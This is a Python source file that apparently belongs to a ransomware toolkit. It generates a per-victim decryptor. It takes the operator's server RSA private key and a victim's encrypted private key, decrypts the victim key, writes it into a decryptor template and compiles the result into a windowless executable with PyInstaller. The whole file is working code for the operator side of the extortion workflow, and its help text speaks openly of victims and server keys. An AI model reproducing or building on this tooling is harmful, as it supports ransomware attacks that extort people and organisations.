# Date: 11/03/2019
# Author: Mohamed
# Description: Generate a decryptor

import os
import sys
import shlex
import shutil
import tempfile
from os import path
from lib.file import File
from argparse import ArgumentParser
from agent.lib.crypto import CryptoRSA


try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)


class Args:

    def __init__(self):
        self.name = None
        self.type = None
        self.server_key = None
        self.victim_key = None

    def error(self, error):
        print('Error: {}'.format(error))

    def get_args(self):
        parser = ArgumentParser()

        parser.add_argument('-sk',
                            '--serverkey',
                            required=True,
                            help='the path to the private RSA key of the server. Must run thor.py to generate keys \
                            Example: -sk ../server/keys/private.key')

        parser.add_argument('-vk',
                            '--victimkey',
                            required=True,
                            help='the path to the encrypted private RSA key of the victim. Must get that key from the victim \
                            Example: -vk encrypted_private.ekey')

        parser.add_argument('-n',
                            '--name',
                            required=True,
                            help='the name of the output file. \
                            Example: -n mydecryptor')

        parser.add_argument('-t',
                            '--type',
                            default='exe',
                            help='the output type.\
                            Example: -t python \
                            Example: -t exe')

        return parser.parse_args()

    def set_args(self):
        args = self.get_args()
        self.name = args.name
        self.type = args.type
        self.server_key = args.serverkey
        self.victim_key = args.victimkey

        if any([not self.valid_type, not self.valid_server_key, not self.valid_victim_key]):
            return False
        return True

    @property
    def valid_server_key(self):
        if not os.path.exists(self.server_key):
            self.error('Invalid path to private RSA key of the server')
            return False
        if not self.server_key.endswith('.key'):
            self.error(
                'Invalid file type for private RSA key of the server; must end with .key')
            return False
        return True

    @property
    def valid_victim_key(self):
        if not os.path.exists(self.victim_key):
            self.error(
                'Invalid path to encrypted private RSA key of the victim')
            return False
        if not self.victim_key.endswith('.ekey'):
            self.error(
                'Invalid file type for encrypted private RSA key of the victim; must end with .ekey')
            return False
        return True

    @property
    def valid_type(self):
        if not any([self.type == 'exe', self.type == 'python']):
            self.error('Invalid type')
            return False
        self.type = True if self.type == 'exe' else False
        return True


class Executor:

    def __init__(self, filename, victim_ecrypted_RSA_private_key, server_RSA_private_key, exe=False):
        self.victim_key = victim_ecrypted_RSA_private_key
        self.server_key = server_RSA_private_key
        self.victim_key_decrypted = b''
        self.filename = filename
        self.exe = exe

        self.output_dir = 'output'
        self.tmp_dir = tempfile.mkdtemp()
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.agent_py_temp = os.path.join('agent', f'{filename}.py')
        self.agent_template = os.path.join('agent', 'template_decryptor.py')
        self.agent_compiled = os.path.join(self.dist_path, f'{filename}.exe')

    def decrypt_key(self, retries=1, chunk_size=512):
        with open(self.server_key, 'rb') as f:
            server_RSA_private_key = f.read()

        f = File.read(self.victim_key, True, chunk_size)

        try:
            for data in f:
                self.victim_key_decrypted += CryptoRSA.decrypt(
                data, server_RSA_private_key)
        except Exception as e:
            if retries:
                self.decrypt_key(retries-1, chunk_size=256)
            else:
                raise e         

    def compile_file(self, path):
        path = os.path.abspath(path)

        build_path = os.path.join(self.tmp_dir, 'build')
        cmd = 'pyinstaller -y -F -w {}'.format(shlex.quote(path))

        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
            ['--workpath', build_path] + ['--specpath', self.tmp_dir]

        pyi.run()

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))

        if self.exe:
            self.compile_file(py_temp)

    def compile_agent(self):
        _dict = {
            'victim_RSA_private_key': repr(self.victim_key_decrypted),
        }

        self.write_template(self.agent_template, self.agent_py_temp, _dict)

    def move_file(self, file):
        if not os.path.exists(self.output_dir):
            os.mkdir(self.output_dir)
        else:
            _path = os.path.join(self.output_dir, file)
            if os.path.exists(_path):
                os.remove(_path)

        path = os.path.join(self.dist_path, file)
        shutil.move(path, self.output_dir)

    def start(self):
        self.decrypt_key()
        self.compile_agent()

        if self.exe:
            file = os.listdir(self.dist_path)[0]
            self.move_file(file)
            self.clean_up()

    def clean_up(self):
        shutil.rmtree(self.tmp_dir)
        os.remove(self.agent_py_temp)


if __name__ == '__main__':
    args = Args()

    if not args.set_args():
        exit()

    executor = Executor(args.name, args.victim_key, args.server_key, args.type)
    executor.start()

    os.system('cls' if is_win else 'clear')
    print('\nFinished creating {}'.format(executor.filename +
                                          '.exe' if executor.exe else executor.agent_py_temp))
    print('Look in the directory named output for your exe file' if executor.exe else 'Look in the directory named agent for your Python file')
